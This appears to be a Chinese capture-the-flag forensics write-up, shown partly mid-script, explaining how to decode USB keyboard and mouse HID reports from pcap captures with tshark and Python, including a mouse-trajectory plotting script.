class="hljs-string">    0x3a: (&#x27;[F1]&#x27;, &#x27;[F1]&#x27;),                     # F1</span><br><span class="hljs-string">    0x3b: (&#x27;[F2]&#x27;, &#x27;[F2]&#x27;),                     # F2</span><br><span class="hljs-string">    0x3c: (&#x27;[F3]&#x27;, &#x27;[F3]&#x27;),                     # F3</span><br><span class="hljs-string">    0x3d: (&#x27;[F4]&#x27;, &#x27;[F4]&#x27;),                     # F4</span><br><span class="hljs-string">    0x3e: (&#x27;[F5]&#x27;, &#x27;[F5]&#x27;),                     # F5</span><br><span class="hljs-string">    0x3f: (&#x27;[F6]&#x27;, &#x27;[F6]&#x27;),                     # F6</span><br><span class="hljs-string">    0x40: (&#x27;[F7]&#x27;, &#x27;[F7]&#x27;),                     # F7</span><br><span class="hljs-string">    0x41: (&#x27;[F8]&#x27;, &#x27;[F8]&#x27;),                     # F8</span><br><span class="hljs-string">    0x42: (&#x27;[F9]&#x27;, &#x27;[F9]&#x27;),                     # F9</span><br><span class="hljs-string">    0x43: (&#x27;[F10]&#x27;, &#x27;[F10]&#x27;),                   # F10</span><br><span class="hljs-string">    0x44: (&#x27;[F11]&#x27;, &#x27;[F11]&#x27;),                   # F11</span><br><span class="hljs-string">    0x45: (&#x27;[F12]&#x27;, &#x27;[F12]&#x27;),                   # F12</span><br><span class="hljs-string">    0x46: (&#x27;[PRINTSCREEN]&#x27;, &#x27;[PRINTSCREEN]&#x27;),   # Print Screen</span><br><span class="hljs-string">    0x47: (&#x27;[SCROLLLOCK]&#x27;, &#x27;[SCROLLLOCK]&#x27;),     # Scroll Lock</span><br><span class="hljs-string">    0x48: (&#x27;[PAUSE]&#x27;, &#x27;[PAUSE]&#x27;),               # Pause</span><br><span class="hljs-string">    0x49: (&#x27;[INSERT]&#x27;, &#x27;[INSERT]&#x27;),             # Insert</span><br><span class="hljs-string">    0x4a: (&#x27;[HOME]&#x27;, &#x27;[HOME]&#x27;),                 # Home</span><br><span class="hljs-string">    0x4b: (&#x27;[PAGEUP]&#x27;, &#x27;[PAGEUP]&#x27;),             # Page Up</span><br><span class="hljs-string">    0x4c: (&#x27;[DELETE]&#x27;, &#x27;[DELETE]&#x27;),             # Delete Forward</span><br><span class="hljs-string">    0x4d: (&#x27;[END]&#x27;, &#x27;[END]&#x27;),                   # End</span><br><span class="hljs-string">    0x4e: (&#x27;[PAGEDOWN]&#x27;, &#x27;[PAGEDOWN]&#x27;),         # Page Down</span><br><span class="hljs-string">    0x4f: (&#x27;[RIGHTARROW]&#x27;, &#x27;[RIGHTARROW]&#x27;),     # Right Arrow</span><br><span class="hljs-string">    0x50: (&#x27;[LEFTARROW]&#x27;, &#x27;[LEFTARROW]&#x27;),       # Left Arrow</span><br><span class="hljs-string">    0x51: (&#x27;[DOWNARROW]&#x27;, &#x27;[DOWNARROW]&#x27;),       # Down Arrow</span><br><span class="hljs-string">    0x52: (&#x27;[UPARROW]&#x27;, &#x27;[UPARROW]&#x27;),           # Up Arrow</span><br><span class="hljs-string">    0x53: (&#x27;[NUMLOCK]&#x27;, &#x27;[NUMLOCK]&#x27;),           # Num Lock</span><br><span class="hljs-string">    0x54: (&#x27;[KEYPADSLASH]&#x27;, &#x27;/&#x27;),               # Keypad /</span><br><span class="hljs-string">    0x55: (&#x27;[KEYPADASTERISK]&#x27;, &#x27;*&#x27;),            # Keypad *</span><br><span class="hljs-string">    0x56: (&#x27;[KEYPADMINUS]&#x27;, &#x27;-&#x27;),               # Keypad -</span><br><span class="hljs-string">    0x57: (&#x27;[KEYPADPLUS]&#x27;, &#x27;+&#x27;),                # Keypad +</span><br><span class="hljs-string">    0x58: (&#x27;[KEYPADENTER]&#x27;, &#x27;[KEYPADENTER]&#x27;),   # Keypad ENTER</span><br><span class="hljs-string">    0x59: (&#x27;[KEYPAD1]&#x27;, &#x27;1&#x27;),                   # Keypad 1 and End</span><br><span class="hljs-string">    0x5a: (&#x27;[KEYPAD2]&#x27;, &#x27;2&#x27;),                   # Keypad 2 and Down Arrow</span><br><span class="hljs-string">    0x5b: (&#x27;[KEYPAD3]&#x27;, &#x27;3&#x27;),                   # Keypad 3 and PageDn</span><br><span class="hljs-string">    0x5c: (&#x27;[KEYPAD4]&#x27;, &#x27;4&#x27;),                   # Keypad 4 and Left Arrow</span><br><span class="hljs-string">    0x5d: (&#x27;[KEYPAD5]&#x27;, &#x27;5&#x27;),                   # Keypad 5</span><br><span class="hljs-string">    0x5e: (&#x27;[KEYPAD6]&#x27;, &#x27;6&#x27;),                   # Keypad 6 and Right Arrow</span><br><span class="hljs-string">    0x5f: (&#x27;[KEYPAD7]&#x27;, &#x27;7&#x27;),                   # Keypad 7 and Home</span><br><span class="hljs-string">    0x60: (&#x27;[KEYPAD8]&#x27;, &#x27;8&#x27;),                   # Keypad 8 and Up Arrow</span><br><span class="hljs-string">    0x61: (&#x27;[KEYPAD9]&#x27;, &#x27;9&#x27;),                   # Keypad 9 and Page Up</span><br><span class="hljs-string">    0x62: (&#x27;[KEYPAD0]&#x27;, &#x27;0&#x27;),                   # Keypad 0 and Insert</span><br><span class="hljs-string">    0x63: (&#x27;[KEYPADPERIOD]&#x27;, &#x27;.&#x27;),              # Keypad . and Delete</span><br><span class="hljs-string">    0x64: (&#x27;&#x27;, &#x27;&#x27;),                             # Non-US \ and |</span><br><span class="hljs-string">    0x65: (&#x27;&#x27;, &#x27;&#x27;),                             # Application</span><br><span class="hljs-string">    0x66: (&#x27;&#x27;, &#x27;&#x27;),                             # Power</span><br><span class="hljs-string">    0x67: (&#x27;[KEYPADEQUALS]&#x27;, &#x27;=&#x27;),              # Keypad =</span><br><span class="hljs-string">    0x68: (&#x27;[F13]&#x27;, &#x27;[F13]&#x27;),                   # F13</span><br><span class="hljs-string">    0x69: (&#x27;[F14]&#x27;, &#x27;[F14]&#x27;),                   # F14</span><br><span class="hljs-string">    0x6a: (&#x27;[F15]&#x27;, &#x27;[F15]&#x27;),                   # F15</span><br><span class="hljs-string">    0x6b: (&#x27;[F16]&#x27;, &#x27;[F16]&#x27;),                   # F16</span><br><span class="hljs-string">    0x6c: (&#x27;[F17]&#x27;, &#x27;[F17]&#x27;),                   # F17</span><br><span class="hljs-string">    0x6d: (&#x27;[F18]&#x27;, &#x27;[F18]&#x27;),                   # F18</span><br><span class="hljs-string">    0x6e: (&#x27;[F19]&#x27;, &#x27;[F19]&#x27;),                   # F19</span><br><span class="hljs-string">    0x6f: (&#x27;[F20]&#x27;, &#x27;[F20]&#x27;),                   # F20</span><br><span class="hljs-string">    0x70: (&#x27;[F21]&#x27;, &#x27;[F21]&#x27;),                   # F21</span><br><span class="hljs-string">    0x71: (&#x27;[F22]&#x27;, &#x27;[F22]&#x27;),                   # F22</span><br><span class="hljs-string">    0x72: (&#x27;[F23]&#x27;, &#x27;[F23]&#x27;),                   # F23</span><br><span class="hljs-string">    0x73: (&#x27;[F24]&#x27;, &#x27;[F24]&#x27;),                   # F24</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">def parse_boot_keyboard_report(data: bytearray):</span><br><span class="hljs-string">    # 数据解析</span><br><span class="hljs-string">    modifiers = data[0]  # 修改键字节</span><br><span class="hljs-string">    keys = data[2:8]      # 键码字节</span><br><span class="hljs-string"></span><br><span class="hljs-string">    # 将修改键字节中的位解码为按键修饰符</span><br><span class="hljs-string">    ctrl = (modifiers &amp; 0x11) != 0</span><br><span class="hljs-string">    shift = (modifiers &amp; 0x22) != 0</span><br><span class="hljs-string">    alt = (modifiers &amp; 0x44) != 0</span><br><span class="hljs-string">    gui = (modifiers &amp; 0x88) != 0</span><br><span class="hljs-string"></span><br><span class="hljs-string">    # 解析键码字节并将其映射为字符</span><br><span class="hljs-string">    characters = []</span><br><span class="hljs-string">    for key in keys:</span><br><span class="hljs-string">        if key != 0:</span><br><span class="hljs-string">            # 键码不为0则查询映射表</span><br><span class="hljs-string">            if key in BOOT_KEYBOARD_MAP:</span><br><span class="hljs-string">                characters.append(BOOT_KEYBOARD_MAP[key][shift])</span><br><span class="hljs-string">            else:</span><br><span class="hljs-string">                characters.append(None)</span><br><span class="hljs-string">    return (ctrl, shift, alt, gui, characters)</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">def help_formatter(prog):</span><br><span class="hljs-string">    return argparse.HelpFormatter(prog, max_help_position=40)</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">def main():</span><br><span class="hljs-string">    # 解析命令行参数</span><br><span class="hljs-string">    parser = argparse.ArgumentParser(</span><br><span class="hljs-string">        description=&#x27;Parse keyboard report data and output as text&#x27;, formatter_class=help_formatter)</span><br><span class="hljs-string">    parser.add_argument(&#x27;pcapng_file&#x27;, help=&#x27;path to the pcapng file&#x27;)</span><br><span class="hljs-string">    args = parser.parse_args()</span><br><span class="hljs-string"></span><br><span class="hljs-string">    # 通过tshark解析pcapng文件，获取键盘数据包</span><br><span class="hljs-string">    tmpfile = NamedTemporaryFile(delete=False)</span><br><span class="hljs-string">    tmpfile.close()</span><br><span class="hljs-string"></span><br><span class="hljs-string">    command = &quot;</span>tshark -r %s -T fields -e usbhid.data -e usb.capdata &gt; %s<span class="hljs-string">&quot; % (</span><br><span class="hljs-string">        args.pcapng_file, tmpfile.name)</span><br><span class="hljs-string">    os.system(command)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    with open(tmpfile.name, &#x27;r&#x27;) as f:</span><br><span class="hljs-string">        lines = f.readlines()</span><br><span class="hljs-string"></span><br><span class="hljs-string">    os.unlink(tmpfile.name)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    # 解析键盘数据包，获取输入字符</span><br><span class="hljs-string">    text = &quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">    for line in lines:</span><br><span class="hljs-string">        capdata = line.strip().replace(&#x27;:&#x27;, &#x27;&#x27;)</span><br><span class="hljs-string">        if capdata:</span><br><span class="hljs-string">            data = bytearray.fromhex(capdata)</span><br><span class="hljs-string">            characters = parse_boot_keyboard_report(data)[-1]</span><br><span class="hljs-string">            for character in characters:</span><br><span class="hljs-string">                if character:</span><br><span class="hljs-string">                    text += character</span><br><span class="hljs-string">        else:</span><br><span class="hljs-string">            pass</span><br><span class="hljs-string"></span><br><span class="hljs-string">    raw_text = repr(text)</span><br><span class="hljs-string">    print(f&#x27;Raw output:\n&#123;raw_text&#125;&#x27;)</span><br><span class="hljs-string">    print(f&#x27;Text output:\n&#123;text&#125;&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">if __name__ == &quot;</span>__main__<span class="hljs-string">&quot;:</span><br><span class="hljs-string">    main()</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h2 id="鼠标流量"><a href="#鼠标流量" class="headerlink" title="鼠标流量"></a>鼠标流量</h2><p><a href="https://www.yuque.com/attachments/yuque/0/2025/txt/42988179/1748143151503-64f0a5cf-0cad-4497-a8f7-1ff8f163afb1.txt">data.txt</a></p><p>USB协议鼠标数据部分在Leftover Capture Data域中，数据长度为四个字节。</p><p>其中，</p><p>第一个字节代表按键，当取0x00时，代表没有按键，为0x01时，代表按左按键，为0x02时，代表当前按键为右键；</p><p>第二个字节可以成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移动多少像素，为负时，代表水平左移多少像素；</p><p>第三个字节与第二个字节类似，代表垂直上下移动的偏移。</p><p><img src="/./img/gF3OZWHWg6kRTNIN/1745126908123-e49f79aa-7f3d-4bcd-aa32-876b815868f8-394436.png" alt="1745126908123-e49f79aa-7f3d-4bcd-aa32-876b815868f8.png"></p><p><font style="color:rgb(77, 77, 77);">如图0x0000</font><font style="color:red;">20</font><font style="color:rgb(77, 77, 77);">00，表示鼠标垂直向上移动20</font></p><h3 id="1-题目背景"><a href="#1-题目背景" class="headerlink" title="1.题目背景"></a><font style="color:rgb(79, 79, 79);">1.题目背景</font></h3><p><font style="color:rgb(77, 77, 77);">flag藏于usb流量中，通过USB协议数据中的鼠标移动轨迹转换成flag</font></p><p><font style="color:rgb(0, 0, 0);background-color:rgb(250, 250, 250);">tshark -r usb2.pcap -T fields -e usb.capdata </font><font style="color:rgb(166, 127, 89);">|</font><font style="color:rgb(221, 74, 104);">sed</font><font style="color:rgb(80, 161, 79);">‘&#x2F;^\s*$&#x2F;d’</font><font style="color:rgb(166, 127, 89);">&gt;</font><font style="color:rgb(0, 0, 0);background-color:rgb(250, 250, 250);"> usbdata.txt</font></p><p><img src="/./img/gF3OZWHWg6kRTNIN/1745127142305-5044a87f-cc5f-4c31-ab1b-d113e03c2cdc-300670.png" alt="1745127142305-5044a87f-cc5f-4c31-ab1b-d113e03c2cdc.png"></p><h3 id="2-将文件用冒号进行分隔"><a href="#2-将文件用冒号进行分隔" class="headerlink" title="2.将文件用冒号进行分隔"></a><font style="color:rgb(79, 79, 79);">2.将文件用冒号进行分隔</font></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">#将上面的文件用脚本分隔，加上冒号；<br>f=open(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <br>fi=open(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>  a=f.readline().strip() <br>  <span class="hljs-keyword">if</span> a:<br>    <span class="hljs-keyword">if</span> len(a)==<span class="hljs-number">8</span>:#键盘流量的话len为<span class="hljs-number">16</span>鼠标为<span class="hljs-number">8</span> <br>      out=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-string">      for i in range(0,len(a),2):</span><br><span class="hljs-string">        if i+2 != len(a):</span><br><span class="hljs-string">          out+=a[i]+a[i+1]+&quot;:&quot; </span><br><span class="hljs-string">        else:</span><br><span class="hljs-string">          out+=a[i]+a[i+1] </span><br><span class="hljs-string">      fi.write(out) </span><br><span class="hljs-string">      fi.write(&#x27;</span>\n<span class="hljs-string">&#x27;) </span><br><span class="hljs-string">  else: </span><br><span class="hljs-string">    break </span><br><span class="hljs-string">fi.close()</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p><img src="/./img/gF3OZWHWg6kRTNIN/1745127165772-4d56af6d-1efc-48f4-a1f8-5f0a274fb104-588296.png" alt="1745127165772-4d56af6d-1efc-48f4-a1f8-5f0a274fb104.png"></p><h3 id="3-使用脚本提取坐标数据"><a href="#3-使用脚本提取坐标数据" class="headerlink" title="3.使用脚本提取坐标数据"></a><font style="color:rgb(79, 79, 79);">3.使用脚本提取坐标数据</font></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">nums = []<br>keys = open(<span class="hljs-string">&#x27;Python\\USBread\\mouse\\out.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,encoding=<span class="hljs-string">&quot;utf_16&quot;</span>)<br>f = open(<span class="hljs-string">&#x27;Python\\USBread\\mouse\\xy.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>,encoding=<span class="hljs-string">&quot;utf_16&quot;</span>)<br>posx = <span class="hljs-number">0</span><br>posy = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> line in keys:<br>    <span class="hljs-meta"># <span class="hljs-keyword">if</span> len(<span class="hljs-keyword">line</span>) != 11:</span><br>    <span class="hljs-meta">#     continue</span><br>    x=<span class="hljs-type">int</span>(line[<span class="hljs-number">3</span>:<span class="hljs-number">5</span>],<span class="hljs-number">16</span>)<br>    y=<span class="hljs-type">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">if</span> x&gt;<span class="hljs-number">127</span>:<br>        print (<span class="hljs-string">&quot;aaa&quot;</span>)<br>        x-=<span class="hljs-number">256</span><br>    <span class="hljs-keyword">if</span> y&gt;<span class="hljs-number">127</span>:<br>        print (<span class="hljs-string">&quot;bbb&quot;</span>)<br>        y-=<span class="hljs-number">256</span><br>    posx += x<br>    posy += y<br>    btn_flag = <span class="hljs-type">int</span>(line[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>],<span class="hljs-number">16</span>) #<span class="hljs-number">1</span> <span class="hljs-keyword">for</span> left,<span class="hljs-number">2</span> <span class="hljs-keyword">for</span> right , <span class="hljs-number">0</span> <span class="hljs-keyword">for</span> nothing<br>    <span class="hljs-keyword">if</span> btn_flag == <span class="hljs-number">0</span>:#此处的<span class="hljs-number">0</span>可以修改为<span class="hljs-number">0</span>(未按按键)、<span class="hljs-number">1</span>(左键)、<span class="hljs-number">2</span>(右键)，将单独输出相应坐标文件。<br>        print (posx,posy)<br>        f.write(str(posx))<br>        f.write(<span class="hljs-string">&#x27; &#x27;</span>)<br>        f.write(str(posy))<br>        f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>f.close()<br><br></code></pre></td></tr></table></figure><p><img src="/./img/gF3OZWHWg6kRTNIN/1745127261717-f90c2ec5-ea70-4b55-9190-03997ba36f29-731917.png" alt="1745127261717-f90c2ec5-ea70-4b55-9190-03997ba36f29.png"></p><h3 id="4-将坐标转换成图片"><a href="#4-将坐标转换成图片" class="headerlink" title="4.将坐标转换成图片"></a><font style="color:rgb(79, 79, 79);">4.将坐标转换成图片</font></h3><p><img src="/./img/gF3OZWHWg6kRTNIN/1745127296507-e2fb9199-df5a-42fe-a478-ed9f378575cf-121319.png" alt="1745127296507-e2fb9199-df5a-42fe-a478-ed9f378575cf.png"></p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs c">#!/usr/bin/env python<br><span class="hljs-meta"># coding:utf-8</span><br>import argparse<br>import os<br>from tempfile import NamedTemporaryFile<br>import <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class"><span class="hljs-title">import</span> <span class="hljs-title">matplotlib</span>.<span class="hljs-title">pyplot</span> <span class="hljs-title">as</span> <span class="hljs-title">plt</span></span><br><span class="hljs-class"><span class="hljs-title">from</span> <span class="hljs-title">matplotlib</span>.<span class="hljs-title">lines</span> <span class="hljs-title">import</span> <span class="hljs-title">Line2D</span></span><br><span class="hljs-class"></span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">def</span> <span class="hljs-title">unpack_mouse_data</span>(<span class="hljs-title">data</span>:</span> bytearray):<br>    # 解包鼠标数据包<br>    button_state = data[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">if</span> len(data) == <span class="hljs-number">4</span>:<br>        (x, y) = <span class="hljs-keyword">struct</span>.unpack_from(<span class="hljs-string">&quot;&lt;bb&quot;</span>, data, offset=<span class="hljs-number">1</span>)<br>    elif len(data) == <span class="hljs-number">8</span>:<br>        (x, y) = <span class="hljs-keyword">struct</span>.unpack_from(<span class="hljs-string">&quot;&lt;bb&quot;</span>, data, offset=<span class="hljs-number">1</span>)<br>    elif len(data) == <span class="hljs-number">13</span>:<br>        (x, y) = <span class="hljs-keyword">struct</span>.unpack_from(<span class="hljs-string">&quot;&lt;hh&quot;</span>, data, offset=<span class="hljs-number">2</span>)<br><br>    # 返回解包的数据<br>    <span class="hljs-keyword">return</span> button_state, x, y<br><br><br>def state2text(button_state: <span class="hljs-type">int</span>) -&gt; str:<br>    button_map = &#123;<br>        <span class="hljs-number">0x0</span>: <span class="hljs-string">&#x27;No Button&#x27;</span>,<br>        <span class="hljs-number">0x1</span>: <span class="hljs-string">&#x27;Left Click&#x27;</span>,<br>        <span class="hljs-number">0x2</span>: <span class="hljs-string">&#x27;Right Click&#x27;</span>,<br>        <span class="hljs-number">0x4</span>: <span class="hljs-string">&#x27;Middle Click&#x27;</span>,<br>    &#125;<br>    states = []<br>    <span class="hljs-keyword">if</span> button_state == <span class="hljs-number">0</span>:<br>        states.append(button_map[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> key in button_map:<br>            <span class="hljs-keyword">if</span> button_state &amp; key:<br>                states.append(button_map[key])<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot; And &quot;</span>.join(states)<br><br><br>def main():<br>    # 解析命令行参数<br>    parser = argparse.ArgumentParser(<br>        description=<span class="hljs-string">&#x27;Read mouse data from pcapng file and plot mouse trajectory.&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;pcapng_file&#x27;</span>, help=<span class="hljs-string">&#x27;path to the pcapng file&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;button_mask&#x27;</span>, metavar=<span class="hljs-string">&#x27;button_mask&#x27;</span>, <span class="hljs-keyword">default</span>=<span class="hljs-number">15</span>, type=<span class="hljs-type">int</span>, choices=range(<span class="hljs-number">16</span>), nargs=<span class="hljs-string">&#x27;?&#x27;</span>,<br>                        help=<span class="hljs-string">&#x27;a mask of mouse button states to be included in the trace to display, default is 15&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-o&#x27;</span>, <span class="hljs-string">&#x27;--output&#x27;</span>, <span class="hljs-keyword">default</span>=<span class="hljs-string">&#x27;output.png&#x27;</span>,<br>                        help=<span class="hljs-string">&#x27;output file path, default is &quot;output.png&quot;&#x27;</span>)<br>    args = parser.parse_args()<br><br>    # 通过tshark解析pcapng文件，获取鼠标数据包<br>    tmpfile = NamedTemporaryFile(delete=False)<br>    tmpfile.close()<br><br>    command = <span class="hljs-string">&quot;tshark -r %s -T fields -e usbhid.data -e usb.capdata &gt; %s&quot;</span> % (<br>        args.pcapng_file, tmpfile.name)<br>    os.system(command)<br><br>    with open(tmpfile.name, <span class="hljs-string">&#x27;r&#x27;</span>) as f:<br>        lines = f.readlines()<br><br>    os.unlink(tmpfile.name)<br><br>    x_position = y_position = <span class="hljs-number">0</span><br>    last_button_state = <span class="hljs-number">-1</span><br><br>    # 绘制鼠标轨迹图<br>    fig, ax = plt.subplots()<br>    colormap = [<span class="hljs-string">&#x27;#1f77b4&#x27;</span>, <span class="hljs-string">&#x27;#ff7f0e&#x27;</span>, <span class="hljs-string">&#x27;#2ca02c&#x27;</span>, <span class="hljs-string">&#x27;#d62728&#x27;</span>, <span class="hljs-string">&#x27;#9467bd&#x27;</span>, <span class="hljs-string">&#x27;#8c564b&#x27;</span>, <span class="hljs-string">&#x27;#e377c2&#x27;</span>, <span class="hljs-string">&#x27;#7f7f7f&#x27;</span>,<br>                <span class="hljs-string">&#x27;#bcbd22&#x27;</span>, <span class="hljs-string">&#x27;#17becf&#x27;</span>, <span class="hljs-string">&#x27;#aec7e8&#x27;</span>, <span class="hljs-string">&#x27;#ffbb78&#x27;</span>, <span class="hljs-string">&#x27;#98df8a&#x27;</span>, <span class="hljs-string">&#x27;#ff9896&#x27;</span>, <span class="hljs-string">&#x27;#c5b0d5&#x27;</span>, <span class="hljs-string">&#x27;#c49c94&#x27;</span>]<br><br>    x_values = [x_position]<br>    y_values = [y_position]<br><br>    states = []<br><br>    # 解析鼠标数据包，获取鼠标轨迹坐标<br>    <span class="hljs-keyword">for</span> line in lines:<br>        capdata = line.strip().replace(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;&#x27;)</span><br><span class="hljs-string">        if capdata:</span><br><span class="hljs-string">            data = bytearray.fromhex(capdata)</span><br><span class="hljs-string">            button_state, x_offset, y_offset = unpack_mouse_data(data)</span><br><span class="hljs-string">            x_position += x_offset</span><br><span class="hljs-string">            y_position -= y_offset</span><br><span class="hljs-string"></span><br><span class="hljs-string">            if button_state != last_button_state:</span><br><span class="hljs-string">                if len(x_values) &gt; 1:</span><br><span class="hljs-string">                    color = colormap[last_button_state]</span><br><span class="hljs-string">                    ax.plot(x_values, y_values, color=color)</span><br><span class="hljs-string">                    x_values = [x_values[-1]]</span><br><span class="hljs-string">                    y_values = [y_values[-1]]</span><br><span class="hljs-string">                last_button_state = button_state</span><br><span class="hljs-string"></span><br><span class="hljs-string">            # 筛选符合条件的按钮状态</span><br><span class="hljs-string">            if button_state &amp; args.button_mask or (args.button_mask &amp; 0b1000 and not button_state):</span><br><span class="hljs-string">                if button_state not in states:</span><br><span class="hljs-string">                    states.append(button_state)</span><br><span class="hljs-string">            else:</span><br><span class="hljs-string">                x_values = []</span><br><span class="hljs-string">                y_values = []</span><br><span class="hljs-string"></span><br><span class="hljs-string">            x_values.append(x_position)</span><br><span class="hljs-string">            y_values.append(y_position)</span><br><span class="hljs-string">        else:</span><br><span class="hljs-string">            pass</span><br><span class="hljs-string"></span><br><span class="hljs-string">    if len(x_values) &gt; 1:</span><br><span class="hljs-string">        color = colormap[last_button_state]</span><br><span class="hljs-string">        ax.plot(x_values, y_values, color=color)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    ax.set_xlabel(&#x27;</span>X<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">    ax.set_ylabel(&#x27;</span>Y<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">    ax.set_title(&#x27;</span>Mouse Trajectory<span class="hljs-string">&#x27;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    handles = [Line2D([], [], color=colormap[i], label=state2text(i))</span><br><span class="hljs-string">               for i in states]</span><br><span class="hljs-string">    plt.legend(handles=handles)</span><br><span class="hljs-string">    plt.savefig(args.output)</span><br><span class="hljs-string">    plt.show()</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">if __name__ == &quot;__main__&quot;:</span><br><span class="hljs-string">    main()</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><blockquote><p>更新: 2025-08-20 16:17:11<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/tzeg4079z6g5xnt8">https://www.yuque.com/chaye-apqbl/vsc85q/tzeg4079z6g5xnt8</a></p></blockquote>]]></content>
    
